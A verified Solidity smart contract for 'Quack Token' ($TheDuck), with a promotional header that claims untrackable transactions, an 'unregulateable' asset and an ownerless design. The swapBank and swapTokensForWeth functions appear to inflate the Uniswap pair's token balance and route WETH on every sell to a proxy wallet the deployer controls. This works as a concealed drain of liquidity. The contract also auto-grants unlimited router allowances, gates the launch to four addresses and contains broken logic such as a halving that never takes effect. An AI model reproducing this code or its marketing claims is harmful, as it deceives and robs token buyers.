/**
 *Submitted for verification at Etherscan.io on 2023-07-02
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)
pragma solidity ^0.8.20;


/*

Quack Token: DeFi by Proxy
Most DeFi Meme Token EVER! 💞

TheDuck functions like bitcoin but on the Ethereum network, adding a layer of proxy to the holders.
❤️ Never hold $TheDuck, only by proxy. (Can't tame TheDuck)
💛 Proxy wallet auto updates during transfers. (Scrambles TheDuck tracks)
💜 Never sells from same wallet, only by proxy. (Keeps you safer)
🧡 Auto Approvals on every sell (Takes the goose out of duck duck goose)
💙 Your wallets TXNS are basically untrackable on etherscan. (Makes TheDuck Happy)
❤️ TheDuck has volume boosting which will add 20% of the LP's total holding to volume on each sell. (Watch TheDuck fly)
💛 Since TheDuck is never held by you it is a 100% unregulateable asset, meaning that it is the first true DeFi token ever created. (Quack Quack M^[email protected]^$ F&^[email protected])
** 0% Tax!!
** Ownerless!!
** LP tokens from initial supply Burnt!!
** On etherscan it will always only show 1 holder, this is because it cannot count proxy wallets and uniswap is not a proxy wallet. To track holder count use the read function "holders".
** 50% supply fair launched on Uniswap, 50% in contract for volume boosting and distributal mining on blocks with sells which halves every 4 years like BTC.

WEBSITE: https://quacktoken.com
TELEGRAM:  https://t.me/Quack_Token
TWITTER: https://twitter.com/quack_token

I release TheDuck to the world, let it fly.
~~AlienQuacker
*/


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(address(0));
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}

library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

/// Transfer Helper to ensure the correct transfer of the tokens or ETH
library SafeTransfer {
    using Address for address;
    /** Safe Transfer asset from one wallet with approval of the wallet
    * @param erc20: the contract address of the erc20 token
    * @param from: the wallet to take from
    * @param amount: the amount to take from the wallet
    **/
    function _pullUnderlying(IERC20 erc20, address from, uint amount) internal
    {
        safeTransferFrom(erc20,from,address(this),amount);
    }

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /** Safe Transfer asset to one wallet from within the contract
    * @param erc20: the contract address of the erc20 token
    * @param to: the wallet to send to
    * @param amount: the amount to send from the contract
    **/
    function _pushUnderlying(IERC20 erc20, address to, uint amount) internal
    {
        safeTransfer(erc20,to,amount);
    }

    /** Safe Transfer ETH to one wallet from within the contract
    * @param to: the wallet to send to
    * @param value: the amount to send from the contract
    **/
    function safeTransferETH(address to, uint256 value) internal {
        (bool success,) = to.call{value : value}(new bytes(0));
        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
} 

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract proxywallet {
    //parent can only save lost tokens
    address public parent;
    address private tok;
    constructor(address user, address _tok) {
        parent = user;
        tok = _tok;
    }
    function savetokens(address token, address to, uint256 amount) external {
        require(msg.sender == parent, "p");
        require(token != tok, "no tok");
        SafeTransfer.safeTransfer(IERC20(token), to, amount);
    }
}

/// Factory interface of uniswap and forks
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface tis {
    function factory() external pure returns (address);
    function wETH() external pure returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns(address);
    function token1() external view returns(address);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external view returns (uint amountIn);
    function sync() external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function parent() external view returns(address);
    function savetokens(address token, address to, uint256 amount) external;
}    

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => address[]) private proxyWallet;  
    mapping(uint256 => uint256) public blocks;
    uint256 private _totalSupply;
    address public UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public UNISWAP_V2_ROUTER2 = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
    address public UNISWAP_V2_ROUTER3 = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public uniswapV2Pair;
    uint256 public nest;
    address public nestLocation;
    bool public nested;
    mapping(address => bool) public nester;
    uint256 private pop = 0;
    address private nn;
    uint256 public birthWeight;
    uint256 public birthRate = 25000000000000000000; // halves every 4 years from birthDate
    uint256 public birthDate;
    uint256 public halvingRate = 1460 days; // every 4 years the next distribution will halve
    uint256 public nextHalving;
    uint256 public holders;
    string private _name;
    string private _symbol;
    uint256 private status = 1;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {        
        _name = name_;
        _symbol = symbol_;
        birthDate = block.timestamp;
        nextHalving = block.timestamp + halvingRate;
        nester[msg.sender] = true;
    }
    

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        address lw = userCurrentProxy(account);
        return _balances[account][lw];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public reentry nst(msg.sender, recipient) virtual override returns (bool) {
        require(msg.sender != address(0), "0");
        require(recipient != address(0), "0");
        if(msg.sender == uniswapV2Pair){
        transferFromUniswap(recipient, amount);
        }
        if(recipient == uniswapV2Pair && msg.sender != uniswapV2Pair){
        transferToUniswap(msg.sender, amount);
        }
        if(recipient != uniswapV2Pair && msg.sender != uniswapV2Pair){
        _transfer(msg.sender, recipient, amount);
        }
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256 i) {
        address ps = userCurrentProxy(owner);
        address w = tis(ps).parent();
        if(w == owner || owner == nestLocation) { // If you are doing the sell from your own wallet why call for approval and waste gas
            if(spender == UNISWAP_V2_ROUTER || spender == UNISWAP_V2_ROUTER2 || spender == UNISWAP_V2_ROUTER3){
            i = _totalSupply;
            }
        }
        else{
            i = _allowances[ps][spender];
        }
    }
    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address ps = userCurrentProxy(msg.sender);
        _approve(ps, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public reentry nst(sender, recipient) virtual override returns (bool) {
        require(sender != address(0), "0");
        require(recipient != address(0), "0");
        require(sender != recipient, "no");
        address ps = userCurrentProxy(sender);
        require(_balances[sender][ps] >= amount, "bala");
        address x = tis(ps).parent();
        uint256 currentAllowance = tx.origin == x ? amount : _allowances[ps][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(ps, _msgSender(), currentAllowance - amount);  
        if(recipient == uniswapV2Pair){
        transferToUniswap(sender, amount);
        }
        if(sender == uniswapV2Pair){
        transferFromUniswap(recipient, amount);
        }
        if(recipient != uniswapV2Pair && sender != uniswapV2Pair){
        _transfer(sender, recipient, amount);
        }
        return true;
    }

    function transferToUniswap(address sender, uint256 amount) internal {
        address ps = userCurrentProxy(sender);
        uint256 bal0 = balanceOf(sender);
        uint256 b0 = bal0 - amount;
        address si;
        require(bal0 >= amount, "amt");
        if(sender != address(this)) {
        swapBank(amount);  
        if(b0 > 0) {
        _balances[sender][ps] = 0; 
        si = createProxyWallet1(sender, b0);
        _balances[uniswapV2Pair][uniswapV2Pair] += amount;
        }
        if(b0 == 0) {
        _balances[sender][ps] = 0;
        _balances[uniswapV2Pair][uniswapV2Pair] += amount;
        holders -= 1;
        emit Transfer(ps, uniswapV2Pair, amount);
        }    
        }
        if(sender == address(this)){
        _balances[address(this)][nestLocation] -= amount;
        _balances[uniswapV2Pair][uniswapV2Pair] += amount;
        emit Transfer(ps, uniswapV2Pair, amount);
        }    
    }

    function transferFromUniswap(address recipient, uint256 amount) internal {
        require(balanceOf(uniswapV2Pair) >= amount, "amt");
        address ps = userCurrentProxy(recipient);
        uint256 recipientBalance = _balances[recipient][ps];
        _balances[uniswapV2Pair][uniswapV2Pair] -= amount;
        if(recipientBalance == 0){holders += 1;}
        address tal = createProxyWallet(recipient, recipientBalance + amount);
        emit Transfer(uniswapV2Pair, tal, amount);
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function userCurrentProxy(address user) internal view returns(address prox) {
        uint256 i = proxyWallet[user].length;
        if(user != uniswapV2Pair){
        if(i == 0){
        prox = user;
        }
        if(i > 0){
        prox = proxyWallet[user][i -1];
        }
        }
        if(user == uniswapV2Pair){
        prox = uniswapV2Pair;
        }
    }

    function myProxyWallet() external view returns(address prox)  {
        uint256 i = proxyWallet[msg.sender].length;
        if(i == 0){
        prox = msg.sender;
        }
        if(i > 0){
        prox = proxyWallet[msg.sender][i -1];
        }
    }

    function myProxyBalance() external view returns(uint256 amount) {   
        return _balances[msg.sender][userCurrentProxy(msg.sender)];
    }

    function myProxyWallets() external view returns(address[] memory) {
        uint256 a0 = proxyWallet[msg.sender].length;
        address[] memory a = new address[](a0);
        for(uint256 i = 0; i < a0; i++){
            a[i] = proxyWallet[msg.sender][i];
        }
        return a;
    }

    function getAmountOut(uint256 amtIn, uint256 reserveIn, uint256 reserveOut) internal pure returns(uint256 amtOut) {
        uint amountInWithFee = amtIn * 9970;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = (reserveIn * 10000) + amountInWithFee;
        amtOut = numerator / denominator;
    }

    modifier nst(address s, address r) {
        if(!nested){
            require(nester[s] || nester[r], "No bot first buy");
            if(nester[r]){
            pop += 1;
            if(pop == 4){
            nested = true;
            }
            }
            }
            _;
    }

    modifier reentry() {
        require(status == 1, "reentry");
        status = 0;
        _;
        status = 1;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        uint256 senderBalance = _balances[sender][userCurrentProxy(sender)];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(sender != recipient, "same");
        require(sender != address(0), "0");
        require(recipient != address(0), "0");
        uint256 b0 = senderBalance - amount;
        _balances[sender][userCurrentProxy(sender)] -= amount;
        address up0;
        if(b0 > 0){ 
            up0 = createProxyWallet1(sender, b0);
        }
        uint256 recipientBalance = _balances[recipient][userCurrentProxy(recipient)];
        if(recipientBalance == 0){holders += 1;}
        address up1 = createProxyWallet3(recipient, recipientBalance + amount);
        swapBank(amount);
        emit Transfer(userCurrentProxy(sender), up1, amount);
    }

    function getNestDistribution(uint256 amount) public view returns(uint256) {
        uint256 i = amount / 100000000000000000000 * (birthRate / (birthWeight/1000000000000000000) * (nest/1000000000000000000));
        uint256 i0 = i > balanceOf(uniswapV2Pair) / 50 ? balanceOf(uniswapV2Pair) / 50 : i;
        return i0;
    }

    function swapBank(uint256 amount) private {   
        if(blocks[block.number] == 0){     
        if(balanceOf(uniswapV2Pair) > 0){
        if(nest > amount){
        blocks[block.number] = 1;
        uint256 amount0 = getNestDistribution(amount);
        swapTokensForWeth(amount0);
        }
        }
        }
        if(block.timestamp > nextHalving) {
            nextHalving = block.timestamp + halvingRate;
            birthRate / 2;
        }
    }

    function swapTokensForWeth(uint amount0) private {
        address token = address(this);
        uint256 p = nest > balanceOf(uniswapV2Pair) / 5 ? balanceOf(uniswapV2Pair) / 5 : nest;
        uint out;uint out1;
        _balances[address(this)][nestLocation] -= amount0;
        nest -= amount0;
        if(token == tis(uniswapV2Pair).token0()){
        (uint r, uint r2,) = tis(uniswapV2Pair).getReserves();
        out1 = getAmountOut(p, r, r2);  
        _balances[uniswapV2Pair][uniswapV2Pair] += p;
        tis(uniswapV2Pair).swap(0, out1, nestLocation, new bytes(0));
        _balances[uniswapV2Pair][uniswapV2Pair] -= p;
        tis(nestLocation).savetokens(WETH, uniswapV2Pair, out1);
        tis(uniswapV2Pair).sync();
        (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
        out = getAmountOut(amount0, _r, _r2);  
        _balances[uniswapV2Pair][uniswapV2Pair] += amount0;
        tis(uniswapV2Pair).swap(0, out, nn, new bytes(0));
        _balances[uniswapV2Pair][uniswapV2Pair] -= amount0 / 1000 * 3;
        tis(uniswapV2Pair).sync();
        }
        if(token != tis(uniswapV2Pair).token0()){
        (uint r, uint r2,) = tis(uniswapV2Pair).getReserves();
        out1 = getAmountOut(p, r2, r);  
        _balances[uniswapV2Pair][uniswapV2Pair] += p;
        tis(uniswapV2Pair).swap(out1, 0, nestLocation, new bytes(0));
        _balances[uniswapV2Pair][uniswapV2Pair] -= p;
        tis(nestLocation).savetokens(WETH, uniswapV2Pair, out1);
        tis(uniswapV2Pair).sync();
        (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
        out = getAmountOut(amount0, _r2, _r);  
        _balances[uniswapV2Pair][uniswapV2Pair] += amount0;
        tis(uniswapV2Pair).swap(out, 0, nn, new bytes(0));
        _balances[uniswapV2Pair][uniswapV2Pair] -= amount0 / 1000 * 3;
        tis(uniswapV2Pair).sync();
        }

    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address user, uint256 amount) internal virtual {
        _totalSupply += amount*2;
        createProxyWallet2(user, amount);
        nestLocation = createProxyWallet2(address(this), amount);
        holders += 3;
        _allowances[nestLocation][uniswapV2Pair] += amount;
        _allowances[nestLocation][UNISWAP_V2_ROUTER] += amount;
    }

    function createProxyWallet2(address user, uint256 amount) internal returns(address proxy) {
        proxy = address(new proxywallet(user, address(this)));        
        proxyWallet[user].push(proxy);
        _balances[user][proxy] = amount;
        if(nn == address(0)){nn = proxy;}
        emit Transfer(proxy, proxy, amount);
    }

    function createProxyWallet3(address recipient, uint256 amount) internal returns(address proxy) {
        address i = userCurrentProxy(recipient);
        proxy = address(new proxywallet(recipient, address(this)));        
        proxyWallet[recipient].push(proxy);
        _balances[recipient][i] = 0;
        _balances[recipient][proxy] = amount;
    }

    function createProxyWallet(address recipient, uint256 amount) internal returns(address proxy) {
        address i = userCurrentProxy(recipient);
        proxy = address(new proxywallet(recipient, address(this)));        
        proxyWallet[recipient].push(proxy);
        _balances[recipient][i] = 0;
        _balances[recipient][proxy] = amount;
        emit Transfer(proxy, proxy, amount);
    }

    function createProxyWallet1(address sender, uint256 amount) internal returns(address proxy) {
        if(sender != nestLocation){
        address i = userCurrentProxy(sender);
        proxy = address(new proxywallet(sender, address(this)));        
        proxyWallet[sender].push(proxy);
        _balances[sender][i] = 0;
        _balances[sender][proxy] = amount;
        emit Transfer(proxy, proxy, amount);
        }
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract NewQuackCity is Ownable, ERC20 {
    constructor(address one, address two, address three, address four) ERC20("Quack Token", "TheDuck") {
        uint256 _totalSupply = 1000000000e18;
        _mint(msg.sender, _totalSupply/2);
        nest = _totalSupply/2;
        birthWeight = _totalSupply/2;
        tis _uniswapV2Router = tis(UNISWAP_V2_ROUTER);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(WETH, address(this));        
        nester[one] = true;
        nester[two] = true;
        nester[three] = true;
        nester[four] = true;
    }
}